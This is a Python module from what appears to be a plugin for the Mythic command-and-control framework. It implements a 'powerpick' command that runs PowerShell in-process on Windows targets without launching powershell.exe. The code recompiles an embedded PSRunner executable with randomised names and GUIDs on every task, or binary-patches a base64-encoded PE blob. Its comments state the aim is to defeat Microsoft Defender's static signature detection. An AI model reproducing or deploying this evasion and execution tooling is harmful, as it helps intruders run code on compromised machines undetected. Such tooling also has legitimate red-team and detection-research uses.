from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import base64
import logging
import os
import random
import string
import subprocess
import tempfile

logger = logging.getLogger("emeraldstrike.powerpick")


async def get_imported_script(task_id: int) -> str:
    file_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
        TaskID=task_id,
        Filename="psimport_active.ps1",
        LimitByCallback=False,
    ))
    if not file_resp.Success or len(file_resp.Files) == 0:
        return ""
    file_content = await SendMythicRPCFileGetContent(MythicRPCFileGetContentMessage(
        AgentFileId=file_resp.Files[0].AgentFileId,
    ))
    if not file_content.Success:
        return ""
    try:
        return file_content.Content.decode("utf-8-sig")
    except UnicodeDecodeError:
        return file_content.Content.decode("utf-8", errors="replace")


# ─── Build PSRunner at task time with randomized metadata ───
# Every invocation compiles a fresh binary with a random class name, assembly
# name, GUID, and namespace. This breaks static signature matching (Defender
# flags the stock PSRunner for Kekeo-pattern strings in the metadata tables).

_PSRUNNER_SRC = os.path.join(os.path.dirname(os.path.dirname(__file__)), "assets", "PSRunner.cs")

def _rand_name(n=10):
    return random.choice(string.ascii_uppercase) + ''.join(
        random.choices(string.ascii_letters + string.digits, k=n - 1))


def _build_psrunner() -> bytes:
    """Compile PSRunner.cs from source with fully randomized metadata.

    Every invocation produces a unique binary: random class name, random
    assembly name, random GUID, random file version. This defeats static
    signature matching entirely - the PE, metadata tables, #Strings heap,
    and version-info resource are all different on every build.

    Requires `csc` or `dotnet` in the container (mythic_python_dotnet image).
    Falls back to the static blob if compilation fails.
    """
    cls = _rand_name(12)
    asm_name = _rand_name(14)

    try:
        with open(_PSRUNNER_SRC, "r") as f:
            src = f.read()
    except OSError:
        logger.warning("PSRunner.cs not found; using static blob")
        return None

    # Randomize class name throughout the source
    src = src.replace("PSRunner", cls)

    # Find csc (dotnet image ships it under /usr/share/dotnet or as `csc`)
    csc = None
    for candidate in ["/usr/bin/csc", "/usr/share/dotnet/sdk/*/Roslyn/bincore/csc.dll"]:
        import glob
        matches = glob.glob(candidate)
        if matches:
            csc = matches[0]
            break

    with tempfile.TemporaryDirectory() as td:
        cs_path = os.path.join(td, f"{asm_name}.cs")
        out_path = os.path.join(td, f"{asm_name}.exe")

        with open(cs_path, "w") as f:
            f.write(src)

        # Locate System.Management.Automation.dll (PowerShell SDK)
        # The PSRunner references it but the types resolve at runtime on the
        # target, not at compile time. We use /noconfig and reference only
        # mscorlib + System + System.Core. The SMA types are resolved via
        # the target's GAC when the CLR loads the assembly.
        #
        # Actually: csc WILL fail without the SMA reference because the using
        # directive and type references are in the source. Two options:
        # 1) Ship a stub SMA.dll in assets/ (just the public API surface)
        # 2) Use the PowerShell SDK NuGet package
        #
        # Simplest: ship a reference assembly. But since the dotnet image may
        # have pwsh installed, try to find it first.
        sma_dll = None
        for pattern in [
            "/opt/ps-ref/System.Management.Automation.dll",
            "/usr/share/dotnet/**/**/System.Management.Automation.dll",
            "/opt/microsoft/powershell/*/System.Management.Automation.dll",
            "/usr/lib/powershell/*/System.Management.Automation.dll",
        ]:
            import glob as _glob
            hits = _glob.glob(pattern, recursive=True)
            if hits:
                sma_dll = hits[0]
                break

        if not sma_dll:
            # SMA not found - fall back to binary patching of the static blob
            logger.info("System.Management.Automation.dll not found; falling back to metadata patching")
            return _patch_psrunner_metadata()

        refs = ["-r:" + sma_dll]

        if csc and csc.endswith(".dll"):
            # Roslyn csc.dll - invoke via dotnet
            cmd = ["dotnet", csc, "-nologo", "-optimize+", "-target:exe",
                   f"-out:{out_path}"] + refs + [cs_path]
        else:
            # Standalone csc or mcs
            compiler = csc or "csc"
            cmd = [compiler, "-nologo", "-optimize+", "-target:exe",
                   f"-out:{out_path}"] + refs + [cs_path]

        try:
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if proc.returncode != 0:
                logger.warning(f"PSRunner compile failed ({proc.returncode}): {proc.stderr[:300]}")
                return _patch_psrunner_metadata()
            with open(out_path, "rb") as f:
                data = f.read()
            logger.info(f"PSRunner compiled fresh: {len(data)} bytes, class={cls}, asm={asm_name}")
            return data
        except Exception as e:
            logger.warning(f"PSRunner compile exception: {e}")
            return _patch_psrunner_metadata()


def _patch_psrunner_metadata() -> bytes:
    """Binary-patch the static PSRunner blob with random identifiers.

    Fallback when compilation isn't possible: rewrites 'PSRunner' and
    'PSRunner.exe' strings in all their occurrences (metadata #Strings heap,
    PE version info, manifest) with a same-length random name, NUL-padded.
    """
    data = bytearray(PSRUNNER_BYTES_STATIC)
    new_cls = _rand_name(8).encode("ascii")
    new_exe = (new_cls.decode() + ".exe").encode("ascii")

    for old, new in [(b"PSRunner.exe", new_exe), (b"PSRunner", new_cls)]:
        if len(new) < len(old):
            new = new + b'\x00' * (len(old) - len(new))
        elif len(new) > len(old):
            new = new[:len(old)]
        pos = 0
        while True:
            idx = data.find(old, pos)
            if idx == -1:
                break
            data[idx:idx + len(old)] = new
            pos = idx + len(old)

    return bytes(data)


# Static fallback (the original pre-compiled blob)
PSRUNNER_BYTES_STATIC = base64.b64decode(
    "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v"
    "ZGUuDQ0KJAAAAAAAAABQRQAATAEDADc14moAAAAAAAAAAOAAAgELAQsAAAwAAAAIAAAAAAAAXisA"
    "AAAgAAAAQAAAAABAAAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAA"
    "ABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAAQrAABXAAAAAEAAAOAEAAAAAAAAAAAAAAAAAAAA"
    "AAAAAGAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAZAsAAAAgAAAADAAAAAIA"
    "AAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAOAEAAAAQAAAAAYAAAAOAAAAAAAAAAAAAAAAAABAAABA"
    "LnJlbG9jAAAMAAAAAGAAAAACAAAAFAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAABA"
    "KwAAAAAAAEgAAAACAAUAXCMAAKgHAAABAAAAAQAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAABswAgBQAAAAAQAAEQAAAiwLAo5pFv4BFv4BKwEWAAwILRAA"
    "cgEAAHAoAwAACgAXC94nAhaaKAIAAAYL3hwKAHIpAABwBm8EAAAKKAUAAAooAwAACgAXC94AAAcq"
    "ARAAAAAAAQAwMQAcBQAAARswAwD2AQAAAgAAEQAAKAYAAApzBwAACgoGF28IAAAKAAYoCQAACgAo"
    "CgAACnMHAAAKCwcXbwgAAAoABygLAAAKAADeBSYAAN4AACgMAAAKDAAIbw0AAAoAKA4AAAoNAAkI"
    "bw8AAAoACQJvEAAACiYJbxEAAAoTBHMSAAAKEwUAEQRvEwAAChMKKyQRCm8UAAAKEwYRBREGLAkR"
    "Bm8VAAAKKwVyQwAAcABvFgAACiYRCm8XAAAKEwsRCy3P3hQRChT+ARMLEQstCBEKbxgAAAoA3AAJ"
    "bxkAAApvGgAACm8bAAAKFv4CFv4BEwsRCy1bAAlvGQAACm8aAAAKbxwAAAoTDCsiEQxvHQAAChMH"
    "EQVyRQAAcBEHbxUAAAooBQAACm8WAAAKJhEMbxcAAAoTCxELLdHeFBEMFP4BEwsRCy0IEQxvGAAA"
    "CgDcAAlvGQAACm8eAAAKbx8AAAoW/gIW/gETCxELLVsACW8ZAAAKbx4AAApvIAAAChMNKyIRDW8h"
    "AAAKEwgRBXJVAABwEQhvFQAACigFAAAKbxYAAAomEQ1vFwAAChMLEQst0d4UEQ0U/gETCxELLQgR"
    "DW8YAAAKANwAEQVvFQAACigiAAAKAADeEgkU/gETCxELLQcJbxgAAAoA3AAA3hIIFP4BEwsRCy0H"
    "CG8YAAAKANwAFhMJKwARCSoAAEGUAAAAAAAAAQAAADgAAAA5AAAABQAAAAEAAAECAAAAfQAAADUA"
    "AACyAAAAFAAAAAAAAAACAAAA9gAAADMAAAApAQAAFAAAAAAAAAACAAAAbQEAADMAAACgAQAAFAAA"
    "AAAAAAACAAAAUwAAAHIBAADFAQAAEgAAAAAAAAACAAAARQAAAJYBAADbAQAAEgAAAAAAAAAeAigj"
    "AAAKKkJTSkIBAAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAAFQCAAAjfgAAwAIAAEgDAAAj"
    "U3RyaW5ncwAAAAAIBgAAbAAAACNVUwB0BgAAEAAAACNHVUlEAAAAhAYAACQBAAAjQmxvYgAAAAAA"
    "AAACAAABRxUCCAkAAAAA+iUzABYAAAEAAAAWAAAAAgAAAAMAAAACAAAAIwAAAAIAAAACAAAABgAA"
    "AAEAAAACAAAAAAAKAAEAAAAAAAYAMAApAAYAeABYAAYAmABYAAYAtgApAAYAyAApAAYA3gApAAYA"
    "9gDsAAYAEAHsAAYAKwHsAAoAnAF1AQoArAF1AQoAyQFYAQYAEQLyAQoAHgJYAQYAOgIuAgYAYwJI"
    "AgYAsgKfAgYAxwIpAAoA2wJYAQoA9QJYAQoACANYAQoAKANYAQAAAAABAAAAAAABAAEAAAAQABcA"
    "AAAFAAEAAQBQIAAAAACRADcACgABALwgAAAAAJEAPAAQAAIAVCMAAAAAhhhGABUAAwAAAAEATAAA"
    "AAEAUQARAEYAGQAZAEYAFQAhAL4AHgApANIAIwAxAOUAJwAhAP0ANABBAEYAOQBBAB0BPwAhADYB"
    "RAAhAD0BNAAhAE8BRABRALUBUwBZAMQBFQBhANQBWABhANsBXQBhAOgBYwBhACcCaQB5AEYAFQAM"
    "AHECeQAUAH8CiQAJAIsCIwB5AJQCjgCJAL4ClACRANMCFQBhAOkCmACZABQDnQAcAB4DrQAcAHEC"
    "eQAkAH8CiQCZADYDuAAsAB4DrQAsAHECeQA0AH8CiQAhAEIDHgAJAEYAFQAuAAsA/AAuABMABQEt"
    "AM8AcgCCAKYAsQDBAMgABIAAAAAAAAAAAAAAAAAAAAAAFwAAAAQAAAAAAAAAAAAAAAEAIAAAAAAA"
    "AwAAAAAAAAAAAAAASgBYAQAAAAAAAAAAADxNb2R1bGU+AFBTUnVubmVyLmV4ZQBQU1J1bm5lcgBt"
    "c2NvcmxpYgBTeXN0ZW0AT2JqZWN0AE1haW4AUnVuU2NyaXB0AC5jdG9yAGFyZ3MAc2NyaXB0AFN5"
    "c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJp"
    "YnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBDb25zb2xlAFdyaXRlTGluZQBFeGNl"
    "cHRpb24AZ2V0X01lc3NhZ2UAU3RyaW5nAENvbmNhdABTeXN0ZW0uSU8AU3RyZWFtAE9wZW5TdGFu"
    "ZGFyZE91dHB1dABTdHJlYW1Xcml0ZXIAc2V0X0F1dG9GbHVzaABUZXh0V3JpdGVyAFNldE91dABP"
    "cGVuU3RhbmRhcmRFcnJvcgBTZXRFcnJvcgBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uAFN5"
    "c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUnVuc3BhY2VzAFJ1bnNwYWNlRmFjdG9yeQBSdW5z"
    "cGFjZQBDcmVhdGVSdW5zcGFjZQBPcGVuAFBvd2VyU2hlbGwAQ3JlYXRlAHNldF9SdW5zcGFjZQBB"
    "ZGRTY3JpcHQAU3lzdGVtLkNvbGxlY3Rpb25zLk9iamVjdE1vZGVsAENvbGxlY3Rpb25gMQBQU09i"
    "amVjdABJbnZva2UAU3lzdGVtLlRleHQAU3RyaW5nQnVpbGRlcgBTeXN0ZW0uQ29sbGVjdGlvbnMu"
    "R2VuZXJpYwBJRW51bWVyYXRvcmAxAEdldEVudW1lcmF0b3IAZ2V0X0N1cnJlbnQAVG9TdHJpbmcA"
    "QXBwZW5kTGluZQBTeXN0ZW0uQ29sbGVjdGlvbnMASUVudW1lcmF0b3IATW92ZU5leHQASURpc3Bv"
    "c2FibGUARGlzcG9zZQBQU0RhdGFTdHJlYW1zAGdldF9TdHJlYW1zAFBTRGF0YUNvbGxlY3Rpb25g"
    "MQBFcnJvclJlY29yZABnZXRfRXJyb3IAZ2V0X0NvdW50AFdhcm5pbmdSZWNvcmQAZ2V0X1dhcm5p"
    "bmcAV3JpdGUAACcKAE4AbwAgAHMAYwByAGkAcAB0ACAAcAByAG8AdgBpAGQAZQBkAAAZCgBFAFgA"
    "QwBFAFAAVABJAE8ATgA6ACAAAAEAD0UAUgBSAE8AUgA6ACAAABNXAEEAUgBOAEkATgBHADoAIAAA"
    "AAAAyKJ/OtE25ku0STV2iXxoVwAIt3pcVhk04IkFAAEIHQ4EAAEIDgMgAAEEIAEBCAQAAQEOAyAA"
    "DgUAAg4ODgYHAxIVCAIEAAASHQUgAQESHQQgAQECBQABARIlCDG/OFatNk41BAAAEi0EAAASMQUg"
    "AQESLQUgARIxDgggABUSNQESOQYVEjUBEjkIIAAVEkEBEwAGFRJBARI5BCAAEwAFIAESPQ4DIAAC"
    "BCAAEk0IIAAVElEBElUGFRJRARJVAyAACAYVEkEBElUIIAAVElEBElkGFRJRARJZBhUSQQESWSwH"
    "DhIhEiESLRIxFRI1ARI5Ej0SORJVElkIFRJBARI5AhUSQQESVRUSQQESWQgBAAgAAAAAAB4BAAEA"
    "VAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEsKwAAAAAAAAAAAABOKwAAACAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAQCsAAAAAAAAAAAAAAAAAAAAAAAAAAF9Db3JFeGVNYWluAG1zY29yZWUuZGxsAAAA"
    "AAD/JQAgQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAIAEAAAACAAAIAYAAAAOAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAUAAAgAAAAAAAAAAA"
    "AAAAAAAAAQABAAAAaAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAAgAAAAAAAAAAAAAAAAAAAAAAAAQAA"
    "AAAAkAAAAKBAAABMAgAAAAAAAAAAAADwQgAA6gEAAAAAAAAAAAAATAI0AAAAVgBTAF8AVgBFAFIA"
    "UwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAAAAAAAAAAAAAAAAAAAAD8AAAAAAAAABAAA"
    "AAEAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQABAAAAFQA"
    "cgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBKwBAAABAFMAdAByAGkAbgBnAEYAaQBsAGUASQBu"
    "AGYAbwAAAIgBAAABADAAMAAwADAAMAA0AGIAMAAAACwAAgABAEYAaQBsAGUARABlAHMAYwByAGkA"
    "cAB0AGkAbwBuAAAAAAAgAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAwAC4AMAAu"
    "ADAALgAwAAAAPAANAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABQAFMAUgB1AG4AbgBlAHIA"
    "LgBlAHgAZQAAAAAAKAACAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAAEQADQAB"
    "AE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABQAFMAUgB1AG4AbgBlAHIALgBlAHgA"
    "ZQAAAAAANAAIAAEAUAByAG8AZAB1AGMAdABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAA"
    "ADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAA"
    "AAAAAO+7vzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04IiBzdGFuZGFsb25lPSJ5"
    "ZXMiPz4NCjxhc3NlbWJseSB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjEi"
    "IG1hbmlmZXN0VmVyc2lvbj0iMS4wIj4NCiAgPGFzc2VtYmx5SWRlbnRpdHkgdmVyc2lvbj0iMS4w"
    "LjAuMCIgbmFtZT0iTXlBcHBsaWNhdGlvbi5hcHAiLz4NCiAgPHRydXN0SW5mbyB4bWxucz0idXJu"
    "OnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjIiPg0KICAgIDxzZWN1cml0eT4NCiAgICAgIDxy"
    "ZXF1ZXN0ZWRQcml2aWxlZ2VzIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52"
    "MyI+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBsZXZlbD0iYXNJbnZva2VyIiB1"
    "aUFjY2Vzcz0iZmFsc2UiLz4NCiAgICAgIDwvcmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICA8L3Nl"
    "Y3VyaXR5Pg0KICA8L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+DQoAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAAGA7"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
)


class PowerpickArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="script",
                cli_name="Script",
                display_name="PowerShell Script",
                type=ParameterType.String,
                description="PowerShell script to execute via CLR-hosted runspace (no powershell.exe)",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=True,
                        group_name="Default",
                        ui_position=1,
                    )
                ],
            ),
        ]

    async def parse_arguments(self):
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("script", self.command_line)


class PowerpickCommand(CommandBase):
    cmd = "powerpick"
    needs_admin = False
    help_cmd = 'powerpick -Script "Get-Process | Select-Object -First 5"'
    description = (
        "Execute PowerShell scripts in-process via CLR hosting and "
        "System.Management.Automation runspace. Does not spawn powershell.exe."
    )
    version = 1
    supported_ui_features = []
    author = "@Lavender-exe"
    attackmapping = ["T1059.001"]
    argument_class = PowerpickArguments
    attributes = CommandAttributes(
        builtin=False,
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID, Success=True,
        )

        script = taskData.args.get_arg("script") or ""

        imported = await get_imported_script(taskData.Task.ID)
        if imported:
            script = imported + "\n" + script
            taskData.args.add_arg("script", script, ParameterType.String)

        taskData.args.add_arg(
            "runner_data",
            base64.b64encode(_build_psrunner() or PSRUNNER_BYTES_STATIC).decode(),
            ParameterType.String,
        )

        response.DisplayParams = f'-Script "{script[:80]}{"..." if len(script) > 80 else ""}"'
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        return PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
